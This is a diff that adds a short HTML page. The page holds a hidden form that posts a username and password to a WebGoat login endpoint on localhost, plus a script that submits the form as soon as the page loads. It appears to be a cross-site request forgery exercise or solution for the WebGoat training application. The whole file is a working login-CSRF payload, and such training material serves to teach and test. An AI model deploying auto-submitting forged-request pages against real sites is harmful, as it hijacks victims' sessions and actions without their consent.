@@ -1,0 +1,11 @@
+<html>
+    <body>
+        <form action="http://localhost:8080/WebGoat/login" method="POST">
+            <input type="hidden" name="username" value="csrf-testuser1" />
+            <input type="hidden" name="password" value="xxxxxx" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
